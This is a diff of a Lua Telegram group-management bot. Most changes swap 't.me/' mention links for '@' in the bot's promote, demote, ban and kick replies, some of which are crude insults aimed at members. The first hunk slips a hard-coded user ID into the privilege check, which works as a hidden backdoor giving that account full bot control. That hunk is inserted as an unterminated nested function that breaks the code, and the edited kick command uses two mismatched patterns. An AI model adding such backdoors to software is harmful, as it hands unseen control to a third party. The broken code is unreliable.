@@ -258,6 +258,9 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(879123322) then  
 var = true  
+function Can_or_NotCan(user_id,chat_id)
+if tonumber(user_id) == tonumber(1316741340) then  
+var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
@@ -1193,7 +1196,7 @@ end
 database:sadd(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته مطور في البوت'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -1242,7 +1245,7 @@ end
 database:srem(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n??| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n??| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من المطورين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3010,7 +3013,7 @@ database:sadd(bot_id..'GBan:User', result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
 function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n*🔘| تم حظره عام من المجموعات*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3077,7 +3080,7 @@ end
 database:sadd(bot_id..'GBan:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم حظره عام من المجموعات'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3199,7 +3202,7 @@ return false
 end
 function start_function(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم الغاء(الحظر-الكتم) عام من القروبات  '
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3247,7 +3250,7 @@ end
 database:srem(bot_id..'Gmute:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم الغاء حظره عام من المجموعات'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3382,7 +3385,7 @@ return false
 end
 database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته مطور في البوت'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3433,7 +3436,7 @@ end
 database:sadd(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته مطور في البوت'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3456,7 +3459,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Sudo:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من المطورين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3503,7 +3506,7 @@ end
 database:srem(bot_id..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من المطورين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3736,7 +3739,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته منشئ اساسي'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3787,7 +3790,7 @@ end
 database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته منشئ اساسي'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3810,7 +3813,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من الاساسيين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3857,7 +3860,7 @@ end
 database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من الاساسيين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3921,7 +3924,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته منشئ'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -3971,7 +3974,7 @@ end
 database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته منشئ'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -3993,7 +3996,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من المنشئين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4040,7 +4043,7 @@ end
 database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من المنشئين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4084,7 +4087,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته مدير'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4136,7 +4139,7 @@ end
 database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته مدير'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4159,7 +4162,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من المدراء'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4206,7 +4209,7 @@ end
 database:srem(bot_id..'Manager'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من المدراء'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4296,7 +4299,7 @@ return false
 end
 database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته ادمن'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4355,7 +4358,7 @@ end
 database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤|العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤|العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم ترقيته ادمن'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4378,7 +4381,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من الادمنيه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4425,7 +4428,7 @@ end
 database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من الادمنيه'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4468,7 +4471,7 @@ send(msg.chat_id_, msg.id_,'🚸| البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 statusk  = '\n📮| الايدي » `'..result.sender_user_id_..'` \n🔘| تم طرد العضو من هنا'
 send(msg.chat_id_, msg.id_, usertext..statusk)
 end,nil)
@@ -4531,8 +4534,8 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 return false
 end  
 
-if text and text:match("^طرد (%d+)$") and Mod(msg) then 
-local userid = text:match("^طرد (%d+)$") 
+if text and text:match("^عطرد (%d+)$") and Mod(msg) then 
+local userid = text:match("^طرعد (%d+)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -4565,7 +4568,7 @@ end
 chat_kick(msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
- usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+ usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
  statusk  = '\n🔘| تم طرد العضو من هنا'
 send(msg.chat_id_, msg.id_, usertext..statusk)
 else
@@ -4616,7 +4619,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم ترقيته مميز هنا '
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -4676,7 +4679,7 @@ end
 database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤|العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤|العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n🔘| تم ترقيته مميز هنا'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 else
@@ -4700,7 +4703,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله من المميزين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4747,7 +4750,7 @@ end
 database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تنزيله من المميزين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -4796,7 +4799,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'DEVBESSO')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو حمارفي المجموعه \nتعال حبي استلم العربانه من المدير*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -4818,7 +4821,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤¦ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤¦ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو حمارفي المجموعه\nتعال حبي رجع العربانه لمدير*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4865,7 +4868,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع المتهم صخل بنجاح\nالان اصبح صخل القروب*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -4888,7 +4891,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو صخل\nارجع بيتكم*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -4935,7 +4938,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو إلى كلب بنجاح\nتعال يالكلب اعطيك عضمه 😂*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -4957,7 +4960,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » [@"..username.."]'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🔘| ⚡| تم تنزيل العضو كلب\nحبي رجع عضمه*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5004,7 +5007,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🔘| ⚡| تم رفع العضو قرد\n بالقروب تعال حبي خذ الموز 😂*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5026,7 +5029,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو قرد\nرجع الموز 😂*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5073,7 +5076,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Hors:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو حصان\nتعال حبي احطلك سرج وركبك فرني فره حلوه*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5095,7 +5098,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Hors:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو حصان\nرجع السرج*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5142,7 +5145,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو بقره\nها يالبقره تعال احلبك 😂*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5164,7 +5167,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو بقره\nتعال خذ الحليب يالبقره 😂*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5211,7 +5214,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو نعجه\nطلع برا ابو البعرور الوصخ*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5233,7 +5236,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو نعجه\nها خذ البعر حقك 😂*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5280,7 +5283,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Mrti:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو زوجتك\nالآن يمكنكم أخذ راحتكم🤤😉*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5302,7 +5305,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Mrti:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🙋🏻‍♂╿اهــلا عزيزي\n🎫│تم تنزيل الرمه زوجتك بنجاح✔️\nالآن انتم مفترقان☹️💔*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5349,7 +5352,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Qlbi:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
